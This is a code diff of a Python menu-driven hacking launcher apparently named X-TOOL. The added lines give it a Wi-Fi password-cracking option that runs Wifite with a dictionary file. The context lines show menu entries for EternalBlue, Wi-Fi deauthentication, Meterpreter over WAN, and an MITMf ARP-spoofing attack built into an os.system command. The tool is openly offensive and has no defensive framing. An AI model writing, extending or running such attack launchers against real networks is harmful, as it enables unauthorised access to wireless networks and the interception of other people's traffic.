@@ -19,6 +19,7 @@ print('[*]Metasploit Framework')
 print('[*]Aircrack-ng')
 print('[*]Ngrok')
 print('[*]postgresql')
+print('[*]Wifite')
 print('[*]This exploit/windows/smb/ms17_010_psexec, You must download this from network and copy file in Metasploit folder/smb')
 print('')
 print('')
@@ -28,6 +29,7 @@ print('[2] Eternal Blue Win10')
 print('[3] Deauth WiFi network')                                             #Exploits
 print('[4] Meterpreter Over Wan')
 print('[5] MITM Attack (Man in the middle Attack) (Using MITMf)')
+print('[6] Crack Wifi network password!')
 print('')
 query = input("[*] Choose exploit!:").lower()                                       
 if query.startswith('1'):
@@ -91,6 +93,11 @@ if query.startswith('5'):
 	RouterIP = input('Enter Gateway IP!:')
 	MITM = ('python mitmf.py -i ') + (Interface) + (' --spoof --arp --gateway ') + (RouterIP) + (' --upsidedownternet')
 	os.system(MITM)
+if query.startswith('6'):
+	print('You must put your dict in X-TOOL folder!')
+	dictionary = input('Enter name of dictionary file!:')
+	Cracking = ('wifite --dict ') + (dictionary)
+	os.system(Cracking)
 else:
 	print('')
 	print('[X] Sorry, You didnt choose options!')
